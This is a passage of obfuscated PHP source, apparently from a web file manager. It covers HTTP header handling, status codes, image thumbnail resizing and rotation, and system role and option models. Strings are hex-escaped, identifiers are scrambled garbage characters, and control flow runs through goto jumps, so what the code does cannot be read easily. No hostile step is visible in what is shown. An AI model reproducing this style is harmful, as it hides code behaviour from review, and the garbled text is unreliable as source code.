"\110\124\x54\120\137\x43\117\116\124\105\x4e\124\137\x54\x59\x50\x45", "\103\x6f\156\x74\145\156\x74\x2d\x4c\x65\x6e\147\x74\x68" => "\110\124\x54\x50\137\x43\x4f\x4e\x54\105\116\124\137\114\105\x4e\x47\124\x48", "\104\145\160\x74\x68" => "\x48\x54\x54\x50\137\x44\x45\120\x54\110", "\x45\170\x70\145\143\164" => "\110\x54\124\x50\x5f\x45\130\x50\105\x43\x54", "\111\x66\x2d\x4e\x6f\156\x65\55\x4d\141\x74\x63\x68" => "\110\x54\x54\120\x5f\x49\106\x5f\x4e\117\x4e\105\x5f\x4d\101\124\x43\x48", "\111\x66\55\x4d\x61\164\x63\x68" => "\x48\124\x54\x50\137\111\106\137\115\101\124\103\110", "\111\146\x2d\x52\141\156\x67\x65" => "\110\x54\124\120\x5f\111\x46\137\122\x41\x4e\107\x45", "\114\141\163\164\x2d\x4d\x6f\144\x69\x66\x69\x65\x64" => "\110\x54\x54\120\x5f\114\x41\123\x54\137\115\117\x44\x49\x46\111\x45\104", "\x49\x66\x2d\x4d\x6f\x64\151\x66\151\145\x64\55\123\151\156\143\145" => "\x48\x54\124\120\x5f\111\x46\137\x4d\x4f\104\111\106\x49\105\x44\137\x53\x49\x4e\103\x45", "\x49\146\55\x55\x6e\x6d\x6f\x64\151\x66\151\x65\x64\55\123\x69\x6e\x63\x65" => "\110\x54\124\x50\137\111\106\x5f\x55\116\115\117\x44\x49\x46\111\x45\104\x5f\x53\111\116\x43\105", "\x52\x61\x6e\x67\145" => "\110\124\124\120\137\122\x41\x4e\107\x45", "\x54\x69\155\x65\x6f\165\164" => "\110\124\x54\120\x5f\x54\111\x4d\105\117\125\x54", "\111\x66" => "\110\x54\124\x50\137\111\106", "\114\157\x63\153\x2d\124\x6f\x6b\145\156" => "\110\x54\x54\120\137\114\x4f\103\113\x5f\x54\117\113\x45\116", "\117\166\x65\162\x77\162\151\164\145" => "\x48\x54\124\x50\x5f\x4f\126\105\122\127\122\111\x54\105", "\x44\145\163\x74\151\156\141\164\151\157\156" => "\110\124\x54\120\x5f\x44\105\x53\x54\111\x4e\101\124\x49\117\116", "\122\x65\161\x75\x65\x73\164\x2d\111\144" => "\x52\x45\121\x55\105\x53\x54\137\111\104", "\122\145\x71\165\145\x73\x74\55\x42\x6f\144\x79\55\x46\x69\x6c\x65" => "\x52\105\x51\125\x45\123\124\137\x42\x4f\x44\131\137\106\111\x4c\x45", "\x52\145\144\151\x72\x65\143\x74\x2d\x53\x74\x61\164\x75\163" => "\122\105\104\111\x52\x45\103\x54\x5f\123\x54\x41\x54\125\123"); public static function init() { static $B…”ìÈ≈ÒÖ = false; if ($B…”ìÈ≈ÒÖ) { return; } foreach ($_SERVER as $DÚ√´Ÿ°œÂ => $cï„´å≠∞) { $DÚ√´Ÿ°œÂ = strtoupper($DÚ√´Ÿ°œÂ); if (!array_key_exists($DÚ√´Ÿ°œÂ, $_SERVER)) { continue; } $_SERVER[$DÚ√´Ÿ°œÂ] = $cï„´å≠∞; } foreach (self::$_headers as $DÚ√´Ÿ°œÂ => $aô÷ÒäÃËÓ) { if (!array_key_exists($DÚ√´Ÿ°œÂ, $_SERVER)) { continue; } $_SERVER[$DÚ√´Ÿ°œÂ] = $_SERVER[$aô÷ÒäÃËÓ]; $_SERVER[strtoupper($DÚ√´Ÿ°œÂ)] = $_SERVER[$aô÷ÒäÃËÓ]; } } public static function get($eÉ°ëﬂ¢éû) { self::init(); return $_SERVER[$eÉ°ëﬂ¢éû] ? $_SERVER[$eÉ°ëﬂ¢éû] : $_SERVER[$_SERVER[∞„˜ƒÑºª][1225] . strtoupper($eÉ°ëﬂ¢éû)]; } public static function method() { return strtoupper(self::get($_SERVER[∞„˜ƒÑºª][150])); } public static function length() { $fïﬂùõå≈≤ =& $_SERVER[∞„˜ƒÑºª]; $CáœÑªÏ≠Û = self::get($fïﬂùõå≈≤[1226]); if (!$CáœÑªÏ≠Û) { $CáœÑªÏ≠Û = self::get($fïﬂùõå≈≤[852]); } return $CáœÑªÏ≠Û; } public static function range() { $F±™¢√Áå£ =& $_SERVER[∞„˜ƒÑºª]; $dé’´¥¯ÿû = self::get($F±™¢√Áå£[194]); if (!$dé’´¥¯ÿû) { return !1; } if (!preg_match($F±™¢√Áå£[1227], $dé’´¥¯ÿû, $Cœéõ‘ƒ‹)) { return !1; } if ($Cœéõ‘ƒ‹[1] === $F±™¢√Áå£[33] && $Cœéõ‘ƒ‹[2] === $F±™¢√Áå£[33]) { return !1; } return array($Cœéõ‘ƒ‹[1] !== $F±™¢√Áå£[33] ? $Cœéõ‘ƒ‹[1] : null, $Cœéõ‘ƒ‹[2] !== $F±™¢√Áå£[33] ? $Cœéõ‘ƒ‹[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\103\157\x6e\x74\151\156\x75\x65", "\61\60\x31" => "\123\x77\151\164\x63\150\x69\x6e\147\40\120\162\157\x74\x6f\143\157\x6c", "\61\x30\62" => "\120\162\x6f\x63\x65\163\x73\151\x6e\147", "\x31\60\x33" => "\105\141\x72\x6c\x79\40\110\151\156\164\x73", "\62\x30\x30" => "\117\x4b", "\62\60\x31" => "\103\162\145\141\164\145\x64", "\62\60\x32" => "\101\143\x63\x65\160\x74\145\144", "\x32\x30\x33" => "\116\x6f\x6e\55\101\165\x74\150\157\162\151\x74\x61\164\151\x76\145\40\111\156\146\x6f\x72\155\x61\x74\151\157\156", "\62\60\64" => "\116\x6f\x20\x43\x6f\156\x74\x65\x6e\164", "\x32\x30\x35" => "\122\x65\163\x65\x74\x20\103\x6f\156\164\x65\x6e\164", "\x32\60\66" => "\x50\x61\x72\x74\151\x61\x6c\x20\x43\157\x6e\x74\145\x6e\164", "\x32\60\x37" => "\x4d\x75\x6c\164\x69\x2d\123\164\141\164\x75\163", "\x33\60\x30" => "\x4d\x75\x6c\164\x69\160\154\x65\40\x43\150\157\x69\143\x65\163", "\x33\60\61" => "\115\157\x76\145\144\40\x50\145\162\155\x61\156\x65\x6e\x74\x6c\x79", "\x33\60\x32" => "\x46\x6f\x75\156\x64", "\x33\60\63" => "\x53\145\145\x20\x4f\x74\150\145\x72", "\63\x30\x34" => "\x4e\157\x74\x20\115\157\144\151\146\151\145\x64", "\x33\x30\65" => "\125\163\145\x20\120\x72\157\x78\171", "\x33\x30\x37" => "\124\145\155\x70\x6f\162\141\162\x79\x20\x52\x65\144\151\162\x65\143\164", "\63\60\x38" => "\x50\145\x72\x6d\141\156\x65\156\x74\x20\x52\x65\x64\151\162\145\143\x74", "\x34\60\x30" => "\102\x61\144\x20\122\x65\161\165\x65\163\164", "\64\60\61" => "\x55\x6e\x61\x75\x74\150\157\162\151\x7a\x65\x64", "\64\x30\x32" => "\120\141\x79\155\x65\x6e\x74\40\x52\x65\161\165\151\162\x65\x64", "\64\60\x33" => "\106\157\162\142\151\x64\144\145\x6e", "\64\x30\x34" => "\x4e\157\164\40\x46\x6f\165\156\144", "\64\60\x35" => "\x4d\145\x74\x68\157\144\40\116\157\164\40\x41\154\154\157\x77\145\144", "\64\x30\x36" => "\116\157\x74\x20\101\143\x63\145\x70\164\x61\142\154\x65", "\x34\x30\67" => "\x50\x72\x6f\170\171\40\x41\165\x74\x68\145\x6e\164\151\x63\141\164\x69\157\156\40\122\x65\161\x75\x69\x72\145\144", "\x34\60\x38" => "\x52\x65\x71\165\x65\x73\164\x20\x54\x69\x6d\145\x6f\165\x74", "\64\60\x39" => "\x43\157\x6e\x66\154\151\x63\164", "\64\61\60" => "\107\157\156\x65", "\x34\61\61" => "\x4c\x65\156\x67\164\150\x20\x52\145\x71\165\x69\x72\x65\x64", "\x34\61\62" => "\120\x72\x65\x63\x6f\156\x64\151\164\151\x6f\x6e\40\x46\141\x69\154\x65\144", "\64\x31\x33" => "\x52\145\161\x75\145\163\164\x20\105\x6e\164\x69\164\171\40\x54\x6f\x6f\x20\x4c\x61\162\x67\145", "\64\x31\64" => "\x52\145\161\x75\145\163\x74\x20\x55\122\x49\x20\x54\157\x6f\x20\x4c\x61\162\147\145", "\x34\61\65" => "\125\x6e\163\x75\160\160\x6f\x72\x74\x65\144\x20\x4d\x65\x64\151\x61\40\124\x79\x70\145", "\x34\61\66" => "\122\145\x71\x75\x65\x73\x74\145\144\x20\122\x61\x6e\x67\145\x20\x4e\157\x74\40\123\x61\x74\151\163\x66\x69\141\x62\x6c\x65", "\x34\61\67" => "\105\x78\x70\145\x63\164\141\164\x69\157\156\40\106\x61\x69\154\x65\x64", "\64\x32\x32" => "\x55\156\x70\162\x6f\143\145\163\x73\141\142\154\x65\x20\x45\156\164\x69\x74\171", "\64\x32\63" => "\114\x6f\143\x6b\x65\x64", "\64\x32\x34" => "\x46\x61\x69\x6c\145\144\40\x44\x65\160\x65\156\x64\145\156\143\x79", "\x34\x32\65" => "\125\x6e\157\x72\x64\145\x72\145\144\x20\x43\157\154\154\145\x63\x74\x69\157\156", "\x34\x32\x36" => "\125\160\147\x72\x61\x64\x65\x20\122\145\x71\x75\x69\162\x65\x64", "\64\x32\x38" => "\x50\162\145\143\x6f\156\144\151\x74\151\x6f\156\40\122\x65\x71\x75\x69\162\145\144", "\x34\62\71" => "\x54\157\x6f\x20\115\x61\156\171\40\x52\145\161\165\145\x73\x74\x73", "\x34\63\61" => "\122\145\x71\165\x65\x73\164\x20\110\x65\x61\x64\x65\x72\x20\x46\x69\x65\154\x64\163\x20\124\x6f\x6f\x20\114\x61\162\147\x65", "\64\64\64" => "\116\x6f\x20\x52\145\x73\160\157\x6e\x73\145", "\64\65\60" => "\x42\154\x6f\143\153\145\x64\40\142\171\40\x57\x69\156\x64\x6f\167\x73\x20\120\x61\x72\145\156\164\141\x6c\40\103\157\156\164\162\157\154\x73", "\x34\x35\61" => "\x55\x6e\x61\x76\x61\x69\154\141\x62\x6c\145\40\106\157\162\x20\x4c\145\147\x61\x6c\40\x52\x65\x61\163\157\156\163", "\64\x39\x34" => "\122\145\161\x75\145\x73\164\40\x48\x65\x61\x64\x65\162\40\124\157\157\40\x4c\x61\x72\x67\145", "\x35\60\60" => "\x49\156\164\145\162\156\x61\x6c\40\x53\x65\162\x76\x65\x72\x20\105\x72\x72\157\162", "\65\x30\x31" => "\116\157\164\x20\x49\155\x70\x6c\x65\155\145\x6e\164\145\144", "\65\60\x32" => "\x42\x61\x64\40\107\141\164\145\x77\141\171", "\x35\60\x33" => "\x53\x65\x72\166\151\143\x65\40\125\x6e\141\x76\x61\151\154\141\x62\154\x65", "\65\60\64" => "\x47\x61\164\x65\x77\x61\171\40\x54\x69\155\x65\157\165\x74", "\x35\60\65" => "\x48\x54\x54\x50\x20\x56\145\162\x73\151\157\156\x20\x6e\x6f\164\40\163\165\x70\160\x6f\x72\164\145\144", "\65\60\67" => "\111\156\x73\x75\x66\146\151\143\x69\145\156\x74\40\x53\x74\x6f\162\141\147\145"); public static function code($A¢ã˜ÛÒ◊Ö) { $cœûáñÜú€ =& $_SERVER[∞„˜ƒÑºª]; $A¢ã˜ÛÒ◊Ö = $A¢ã˜ÛÒ◊Ö . $cœûáñÜú€[33]; $Bü∂À£ »Ï = self::$statusCode[$A¢ã˜ÛÒ◊Ö]; $Bü∂À£ »Ï = $Bü∂À£ »Ï ? "\110\124\x54\120\x2f\x31\x2e\x31\x20{$A¢ã˜ÛÒ◊Ö}\x20" . $Bü∂À£ »Ï : $cœûáñÜú€[33]; return $Bü∂À£ »Ï; } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($Bù°ÌÒÛò∂, $Fπé±Ö´´ã) { goto AÙäùó§°º; AÙäùó§°º: $this->srcFile = $Bù°ÌÒÛò∂; $this->echoType = $Fπé±Ö´´ã; $this->im = self::image($Bù°ÌÒÛò∂); goto féÕﬂﬁ¯æ‡; féÕﬂﬁ¯æ‡: if (!$this->im) { return !1; } $B›÷∆ÙÌãØ = $_SERVER[∞„˜ƒÑºª][33]; $this->imgData = GetImageSize($Bù°ÌÒÛò∂, $B›÷∆ÙÌãØ); goto EÔò∏¢Ø´√; EÔò∏¢Ø´√: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto bëíà≥ÜŸØ; bëíà≥ÜŸØ: } public static function image($a÷ëåÁ´§Ó) { $bª∆‚âêú˘ =& $_SERVER[∞„˜ƒÑºª]; $C¢Ó“ﬂÇ´ = $bª∆‚âêú˘[33]; $EÌıπ„É»Ω = GetImageSize($a÷ëåÁ´§Ó, $C¢Ó“ﬂÇ´); $eæäâ˜¬ê€ = !1; switch ($EÌıπ„É»Ω[2]) { case IMAGETYPE_GIF: if (!function_exists($bª∆‚âêú˘[1228])) { break; } $eæäâ˜¬ê€ = imagecreatefromgif($a÷ëåÁ´§Ó); break; case IMAGETYPE_JPEG: if (!function_exists($bª∆‚âêú˘[1229])) { break; } $eæäâ˜¬ê€ = imagecreatefromjpeg($a÷ëåÁ´§Ó); break; case IMAGETYPE_PNG: if (!function_exists($bª∆‚âêú˘[1230])) { break; } $eæäâ˜¬ê€ = @imagecreatefrompng($a÷ëåÁ´§Ó); imagesavealpha($eæäâ˜¬ê€, !0); break; case IMAGETYPE_XBM: $eæäâ˜¬ê€ = imagecreatefromxbm($a÷ëåÁ´§Ó); break; case IMAGETYPE_WBMP: $eæäâ˜¬ê€ = imagecreatefromwbmp($a÷ëåÁ´§Ó); break; case IMAGETYPE_BMP: $eæäâ˜¬ê€ = imagecreatefrombmp($a÷ëåÁ´§Ó); break; default: break; } return $eæäâ˜¬ê€; } public static function imageSize($eÇ–ß áÚ⁄) { $DÊ¡˘ï∂Ó =& $_SERVER[∞„˜ƒÑºª]; $fáääﬂÙ€ = GetImageSize($eÇ–ß áÚ⁄); if (!$fáääﬂÙ€) { return !1; } return array($DÊ¡˘ï∂Ó[209] => $fáääﬂÙ€[0], $DÊ¡˘ï∂Ó[874] => $fáääﬂÙ€[1]); } function distortion($a≠Ö•∂„ÙÌ, $e◊´∂¨Îˆà, $D”æÏäå∏˜) { $Bû„Ωçòßí = $this->creatImage($this->im, $e◊´∂¨Îˆà, $D”æÏäå∏˜, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Bû„Ωçòßí, $a≠Ö•∂„ÙÌ); } function prorate($DœÛÀª±Çà, $C’óÿ™Õïä, $Eïñâ»¯âÇ) { $AóÇÖ–’πˆ = $C’óÿ™Õïä / $Eïñâ»¯âÇ; $e∂ÓÛƒÂƒ‹ = $this->srcW / $this->srcH; if ($AóÇÖ–’πˆ <= $e∂ÓÛƒÂƒ‹) { $bÏòû‡ø˘ = $C’óÿ™Õïä; $Cä∫†≠≥∑© = $bÏòû‡ø˘ * ($this->srcH / $this->srcW); } else { $Cä∫†≠≥∑© = $Eïñâ»¯âÇ; $bÏòû‡ø˘ = $Cä∫†≠≥∑© * ($this->srcW / $this->srcH); } if ($this->srcW > $C’óÿ™Õïä || $this->srcH > $Eïñâ»¯âÇ) { $AÎÎâåÌû∞ = $this->creatImage($this->im, $bÏòû‡ø˘, $Cä∫†≠≥∑©, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($AÎÎâåÌû∞, $DœÛÀª±Çà); } else { $AÎÎâåÌû∞ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($AÎÎâåÌû∞, $DœÛÀª±Çà); } } function cut($bÇÍÊÉﬁëÆ, $FæÀê∆’Â≈, $d ‡Éò…ã¡) { goto dÖ¶≠∏¶õ≠; Bêóå£≠Ö¡: $B™‘ÇéõÜ = $this->creatImage($this->im, $c≤≠∂è†∫¬, $a¥ÿæ ö¢à, 0, 0, 0, 0, $this->srcW, $this->srcH); $DΩÜŸ‡òÁƒ = $this->creatImage($B™‘ÇéõÜ, $FæÀê∆’Â≈, $d ‡Éò…ã¡, 0, 0, ($c≤≠∂è†∫¬ - $FæÀê∆’Â≈) / 2, ($a¥ÿæ ö¢à - $d ‡Éò…ã¡) / 2, $FæÀê∆’Â≈, $d ‡Éò…ã¡); imageDestroy($B™‘ÇéõÜ); goto fëø·¶ñ≠û; dÖ¶≠∏¶õ≠: $dÂÿ¡¥†çì = $FæÀê∆’Â≈ / $d ‡Éò…ã¡; $a·ÒÃπË∞à = $this->srcW / $this->srcH; if ($dÂÿ¡¥†çì <= $a·ÒÃπË∞à) { $a¥ÿæ ö¢à = $d ‡Éò…ã¡; $c≤≠∂è†∫¬ = $a¥ÿæ ö¢à * ($this->srcW / $this->srcH); } else { $c≤≠∂è†∫¬ = $FæÀê∆’Â≈; $a¥ÿæ ö¢à = $c≤≠∂è†∫¬ * ($this->srcH / $this->srcW); } goto Bêóå£≠Ö¡; fëø·¶ñ≠û: return $this->echoImage($DΩÜŸ‡òÁƒ, $bÇÍÊÉﬁëÆ); goto e°ÂƒÂ„®ˆ; e°ÂƒÂ„®ˆ: } function backFill($fÏø≤„¿œä, $Bá¯Ó±¡Áê, $b¯›Ã†¨àÁ, $e◊·Á≠å°è = false, $Fº¿ÈåµµÓ = 255, $EÑÓ‰Ø–“Ê = 255, $Cã∂ÇÛª‹´ = 255) { goto EêÏÙ°Ûéò; aœã‰¥…›: if ($e◊·Á≠å°è) { $bﬁÃäËπÑﬂ = imageColorTransparent($EÂÇ¡àÖ™¢, $bﬁÃäËπÑﬂ); $Aã‘•·Òïú = $b¯›Ã†¨àÁ - $D¨ÜØÿËã»; } imageFilledRectangle($EÂÇ¡àÖ™¢, 0, 0, $Bá¯Ó±¡Áê, $b¯›Ã†¨àÁ, $bﬁÃäËπÑﬂ); if ($this->srcW > $Bá¯Ó±¡Áê || $this->srcH > $b¯›Ã†¨àÁ) { $D¯€Êé‚åΩ = $this->creatImage($this->im, $FâÖÁ⁄∫ºî, $D¨ÜØÿËã», 0, 0, 0, 0, $this->srcW, $this->srcH); if ($FâÖÁ⁄∫ºî < $Bá¯Ó±¡Áê) { imageCopy($EÂÇ¡àÖ™¢, $D¯€Êé‚åΩ, ($Bá¯Ó±¡Áê - $FâÖÁ⁄∫ºî) / 2, 0, 0, 0, $FâÖÁ⁄∫ºî, $D¨ÜØÿËã»); } else { if ($D¨ÜØÿËã» < $b¯›Ã†¨àÁ) { imageCopy($EÂÇ¡àÖ™¢, $D¯€Êé‚åΩ, 0, $Aã‘•·Òïú, 0, 0, $FâÖÁ⁄∫ºî, $D¨ÜØÿËã»); } else { imageCopy($EÂÇ¡àÖ™¢, $D¯€Êé‚åΩ, 0, 0, 0, 0, $FâÖÁ⁄∫ºî, $D¨ÜØÿËã»); } } } else { imageCopyMerge($EÂÇ¡àÖ™¢, $this->im, ($Bá¯Ó±¡Áê - $FâÖÁ⁄∫ºî) / 2, $Aã‘•·Òïú, 0, 0, $FâÖÁ⁄∫ºî, $D¨ÜØÿËã», 100); } goto cØ¡ÔÖè¨; EêÏÙ°Ûéò: $b…Ü≠‹µáö = $Bá¯Ó±¡Áê / $b¯›Ã†¨àÁ; $c®¨”ÿà…≠ = $this->srcW / $this->srcH; if ($b…Ü≠‹µáö <= $c®¨”ÿà…≠) { $FâÖÁ⁄∫ºî = $Bá¯Ó±¡Áê; $D¨ÜØÿËã» = $FâÖÁ⁄∫ºî * ($this->srcH / $this->srcW); } else { $D¨ÜØÿËã» = $b¯›Ã†¨àÁ; $FâÖÁ⁄∫ºî = $D¨ÜØÿËã» * ($this->srcW / $this->srcH); } goto F≤ıÙèãÜÛ; F≤ıÙèãÜÛ: if (function_exists($_SERVER[∞„˜ƒÑºª][1231])) { @($EÂÇ¡àÖ™¢ = imageCreateTrueColor($Bá¯Ó±¡Áê, $b¯›Ã†¨àÁ)); if (!$EÂÇ¡àÖ™¢) { $EÂÇ¡àÖ™¢ = imageCreate($Bá¯Ó±¡Áê, $b¯›Ã†¨àÁ); } } else { $EÂÇ¡àÖ™¢ = imageCreate($Bá¯Ó±¡Áê, $b¯›Ã†¨àÁ); } $Aã‘•·Òïú = ($b¯›Ã†¨àÁ - $D¨ÜØÿËã») / 2; $bﬁÃäËπÑﬂ = imagecolorallocate($EÂÇ¡àÖ™¢, $Fº¿ÈåµµÓ, $EÑÓ‰Ø–“Ê, $Cã∂ÇÛª‹´); goto aœã‰¥…›; cØ¡ÔÖè¨: return $this->echoImage($EÂÇ¡àÖ™¢, $fÏø≤„¿œä); goto FÙè‹»Æ∞˘; FÙè‹»Æ∞˘: } function creatImage($EÌÔ±ïøîÃ, $c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ, $A±πèéø¡é, $CéﬁÁøøå , $a÷íÉ ±Óå, $e–Ò¥ïﬁŸÓ, $bﬁêá–∆‡Ü, $a∑¨ê˜îóœ) { if (function_exists($_SERVER[∞„˜ƒÑºª][1231])) { @($c≥£ÇâÏﬁπ = ImageCreateTrueColor($c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ)); @imagealphablending($c≥£ÇâÏﬁπ, !1); @imagesavealpha($c≥£ÇâÏﬁπ, !0); if ($c≥£ÇâÏﬁπ) { imageCopyResampled($c≥£ÇâÏﬁπ, $EÌÔ±ïøîÃ, $A±πèéø¡é, $CéﬁÁøøå , $a÷íÉ ±Óå, $e–Ò¥ïﬁŸÓ, $c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ, $bﬁêá–∆‡Ü, $a∑¨ê˜îóœ); } else { $c≥£ÇâÏﬁπ = ImageCreate($c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ); imageCopyResized($c≥£ÇâÏﬁπ, $EÌÔ±ïøîÃ, $A±πèéø¡é, $CéﬁÁøøå , $a÷íÉ ±Óå, $e–Ò¥ïﬁŸÓ, $c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ, $bﬁêá–∆‡Ü, $a∑¨ê˜îóœ); } } else { $c≥£ÇâÏﬁπ = ImageCreate($c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ); imageCopyResized($c≥£ÇâÏﬁπ, $EÌÔ±ïøîÃ, $A±πèéø¡é, $CéﬁÁøøå , $a÷íÉ ±Óå, $e–Ò¥ïﬁŸÓ, $c»ä¯º®Ãˆ, $a¬´∑ÛÂàõ, $bﬁêá–∆‡Ü, $a∑¨ê˜îóœ); } return $c≥£ÇâÏﬁπ; } public function imgRotate($d¨âØ«§øŒ, $A—◊¡Ö‘ä) { goto c–Æ´áÃúØ; e≠∞Æ¢µπÆ: return $fÉÊ›ïªë›; goto Böò¢»àâ⁄; c—ﬁßñêã∆: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $fÉÊ›ïªë› = imagegif($c∂≠æ™π¥–, $d¨âØ«§øŒ); break; case IMAGETYPE_JPEG: $fÉÊ›ïªë› = imagejpeg($c∂≠æ™π¥–, $d¨âØ«§øŒ, 100); break; case IMAGETYPE_PNG: $fÉÊ›ïªë› = imagePNG($c∂≠æ™π¥–, $d¨âØ«§øŒ); break; default: break; } imageDestroy($c∂≠æ™π¥–); imageDestroy($this->im); goto e≠∞Æ¢µπÆ; c–Æ´áÃúØ: if (!$this->im || $A—◊¡Ö‘ä % 360 === 0 || !function_exists($_SERVER[∞„˜ƒÑºª][1232])) { return !1; } $c∂≠æ™π¥– = imageRotate($this->im, 360 - $A—◊¡Ö‘ä, 0); $fÉÊ›ïªë› = !1; goto c—ﬁßñêã∆; Böò¢»àâ⁄: } function echoImage($bè≈ú∏∂ á, $b∏ˆáÏôõî) { goto bÁô¨é…Èô; bÍ‹º¬ÁÁ¬: imageDestroy($this->im); return $cäÉªôπ∫º; goto Cøü„ïíë§; bÁô¨é…Èô: $fÃÈ˜µ¢≠” =& $_SERVER[∞„˜ƒÑºª]; if (!$bè≈ú∏∂ á) { return !1; } ob_get_clean(); goto aÀΩòØââé; aÀΩòØââé: $cäÉªôπ∫º = !1; switch ($this->echoType) { case $fÃÈ˜µ¢≠”[1233]: $cäÉªôπ∫º = imagePNG($bè≈ú∏∂ á); break; case $fÃÈ˜µ¢≠”[163]: $cäÉªôπ∫º = imagePNG($bè≈ú∏∂ á, $b∏ˆáÏôõî); break; } imageDestroy($bè≈ú∏∂ á); goto bÍ‹º¬ÁÁ¬; Cøü„ïíë§: } } goto E‡á”≠Ç®õ; eÃÍîÕ∑Ô¬: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\x5f\157\x70\164\x69\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\x72\x6f\x6c\x65", "\x72\x6f\154\145\x47\x72\157\x75\160", "\162\x65\147\151\x73\164", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($BÙ†Õ÷°≥Œ) { return "\123\x79\x73\164\x65\155\x4f\x70\164\151\157\156\137{$BÙ†Õ÷°≥Œ}"; } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x72\x6f\154\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\150", "\x6c\141\142\145\x6c", "\144\x69\163\160\154\141\171", "\163\171\x73\164\145\x6d", "\x64\x65\163\x63", "\151\147\x6e\x6f\x72\145\105\170\164", "\151\147\156\157\x72\x65\x46\x69\x6c\145\123\x69\x7a\x65", "\x61\x64\x6d\151\156\151\163\164\162\141\164\x6f\x72", "\163\157\162\164"); public function listData($fŸáøı•Ö¯ = false, $cáíá‰ñ¯ú = "\163\x6f\162\x74", $Cä°‰ö–î = false) { return parent::listData($fŸáøı•Ö¯, $cáíá‰ñ¯ú, $Cä°‰ö–î); } public function update($Aêµ™£‘âÔ, $c®Ü¶è°Ã) { goto bôﬂÛ◊»ˆ…; bôﬂÛ◊»ˆ…: $aö¨öê¨≈í =& $_SERVER[∞„˜ƒÑºª]; $aÚ∏ØŒÙ†» = parent::listData($Aêµ™£‘âÔ); $D·é¥™âã› = $this->findByName($c®Ü¶è°Ã[$aö¨öê¨≈í[28]]); goto Eπª÷›°Ëã; C¿üÃÁ˘®ã: return parent::update($Aêµ™£‘âÔ, $c®Ü¶è°Ã); goto eóß°«”¬ß; Eπª÷›°Ëã: if (!$aÚ∏ØŒÙ†» || $D·é¥™âã› && $D·é¥™âã›[$aö¨öê¨≈í[366]] != $aÚ∏ØŒÙ†»[$aö¨öê¨≈í[366]]) { return !1; } if ($D·é¥™âã›[$aö¨öê¨≈í[1853]] == 1) { $c®Ü¶è°Ã = array($aö¨öê¨≈í[28] => $c®Ü¶è°Ã[$aö¨öê¨≈í[28]], $aö¨öê¨≈í[1534] => $c®Ü¶è°Ã[$aö¨öê¨≈í[1534]]); } $this->filterAuth($c®Ü¶è°Ã[$aö¨öê¨≈í[548]]); goto C¿üÃÁ˘®ã; eóß°«”¬ß: } public function remove($FÃÒ¨Ù±ÑÏ) { $Aë»Ü∏ö®ü = parent::listData($FÃÒ¨Ù±ÑÏ); if (!$Aë»Ü∏ö®ü || $Aë»Ü∏ö®ü[$_SERVER[∞„˜ƒÑºª][804]]) { return !1; } return parent::remove($FÃÒ¨Ù±ÑÏ); } public function add($D¶ö≥¬«ûê) { goto D“ëûå€⁄Â; Eë‚œÚÓáÙ: return parent::insert($D¶ö≥¬«ûê); goto AÜ¢Íí™Öº; A‘ç∏ã·©ü: $C¨êµå¿“€ = array($b∫â∫€ìÙ…[387] => $c¥ÃÙƒﬁ”¿, $b∫â∫€ìÙ…[1522] => $b∫â∫€ìÙ…[33], $b∫â∫€ìÙ…[1518] => $b∫â∫€ìÙ…[1535], $b∫â∫€ìÙ…[1854] => 1, $b∫â∫€ìÙ…[1521] => 0, $b∫â∫€ìÙ…[1855] => 0, $b∫â∫€ìÙ…[1520] => $this->getSort()); $D¶ö≥¬«ûê = array_merge($C¨êµå¿“€, $D¶ö≥¬«ûê); $this->filterAuth($D¶ö≥¬«ûê[$b∫â∫€ìÙ…[548]]); goto Eë‚œÚÓáÙ; D“ëûå€⁄Â: $b∫â∫€ìÙ… =& $_SERVER[∞„˜ƒÑºª]; $c¥ÃÙƒﬁ”¿ = $D¶ö≥¬«ûê[$b∫â∫€ìÙ…[28]]; if ($this->findByName($c¥ÃÙƒﬁ”¿)) { return !1; } goto A‘ç∏ã·©ü; AÜ¢Íí™Öº: } private function getSort() { $BùÍá°Ñü± =& $_SERVER[∞„˜ƒÑºª]; $C•€ Ó´Áà = parent::listData(); $C˘ÆããÑ€Ï = array_to_keyvalue($C•€ Ó´Áà, $BùÍá°Ñü±[33], $BùÍá°Ñü±[1537]); return empty($C˘ÆããÑ€Ï) ? 0 : max($C˘ÆããÑ€Ï) + 1; } private function filterAuth(&$aÃºÉáƒ∫Œ) { $FÔ‚„–Óàâ =& $_SERVER[∞„˜ƒÑºª]; $EÑ±áñË¥ù = array(); $CÙø«Õûèû = array_filter(explode($FÔ‚„–Óàâ[47], $aÃºÉáƒ∫Œ)); foreach ($CÙø«Õûèû as $aÃºÉáƒ∫Œ) { $b¥Ë‹πø¡Û = explode($FÔ‚„–Óàâ[98], $aÃºÉáƒ∫Œ); if ($b¥Ë‹πø¡Û[0] == $FÔ‚„–Óàâ[1181] && $b¥Ë‹πø¡Û[1] != $FÔ‚„–Óàâ[766]) { $EáÉ’òËÖº = $b¥Ë‹πø¡Û[0] . $FÔ‚„–Óàâ[98] . $b¥Ë‹πø¡Û[1] . $FÔ‚„–Óàâ[1856]; if (!in_array($EáÉ’òËÖº, $CÙø«Õûèû)) { $EÑ±áñË¥ù[] = $EáÉ’òËÖº; } } $EÑ±áñË¥ù[] = $aÃºÉáƒ∫Œ; } $aÃºÉáƒ∫Œ = implode($FÔ‚„–Óàâ[47], $EÑ±áñË¥ù); } public function sort($Eú„‡ÙÍÚö, $cèÙ∞•∫πÒ) { return parent::update($Eú„‡ÙÍÚö, 